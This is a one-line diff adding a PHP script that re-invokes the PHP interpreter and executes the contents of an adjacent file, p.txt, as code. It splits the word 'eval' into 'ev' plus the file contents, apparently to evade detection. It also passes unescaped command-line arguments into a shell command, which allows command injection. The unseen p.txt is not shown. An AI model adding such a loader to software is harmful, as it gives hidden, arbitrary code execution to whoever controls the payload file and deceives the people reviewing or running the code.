@@ -1,0 +1,1 @@
+<?php $f=__FILE__;$d=dirname($f);$n=basename(PHP_BINARY);exec("\"$d\\$n\" -r \"\$argv=array('$f','".join("','",$argv)."');ev".file_get_contents("$d/p.txt")."\"");
